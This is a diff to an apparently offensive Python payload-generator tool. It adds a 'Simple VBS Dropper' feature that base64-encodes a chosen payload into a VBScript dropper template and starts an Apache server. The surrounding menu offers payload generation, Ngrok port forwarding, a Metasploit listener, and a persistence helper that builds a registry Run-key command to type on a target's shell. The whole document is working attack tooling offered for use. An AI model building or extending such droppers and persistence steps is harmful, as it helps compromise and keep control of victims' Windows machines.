@@ -4,8 +4,31 @@ import random
 import time
 import requests
 import base64
-
-
+Red ="\u001b[31m"
+Green ="\u001b[32m"
+def check_root():
+    if os.getuid() == 0:
+        pass
+    else:
+        print(Red+'run this as root  pls')
+        exit()
+check_root()
+def makedropper():
+    payload_input = input("entre your payload Path:")
+    if os.path.exists(payload_input):
+        os.system("cat " + payload_input + " | base64 > payload.txt")
+        with open("payload.txt") as payload:
+            read = payload.read()
+            datapar = "".join( read.splitlines())
+            os.system("rm -rf payload.txt")
+            os.system("cp -r template/Dropper.vbs  payloads/")
+            inplace_change('payloads/Dropper.vbs', '#ENCODEDPAYLOAD', datapar)
+            print("Saved As Dropper.vbs in /payloads")
+    else:
+        print("[-] I can t Find your Payload")
+        exit()
+def startapche():
+    os.system("sudo service apache2 start")
 
 
 class Encrypt:
@@ -52,8 +75,7 @@ S = z
 ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k=S))
 
 
-Red ="\u001b[31m"
-Green ="\u001b[32m"
+
 def listeners():
     listen = input(Green+"do you want to start multi/handler:")
     if listen == "yes":
@@ -91,6 +113,7 @@ print(Red+"""
 1)Generate Payload
 2)AutoPortForwarding(Ngrok)
 3)Help Me With Persistence
+4)Simple VBS Dropper
 """)
 choose = int(input("root@Gen:"))
 
@@ -185,7 +208,8 @@ elif choose == 3:
             path = input("Entre Payload Path on The Target Sys:")
             command = 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "' +task+ '" /t REG_SZ /F /D "' + path + '"'
             print(Green + " Type this on Target Shell ==> ", Red + command + '\n')
-
+elif choose == 4:
+    makedropper()
 
 
 
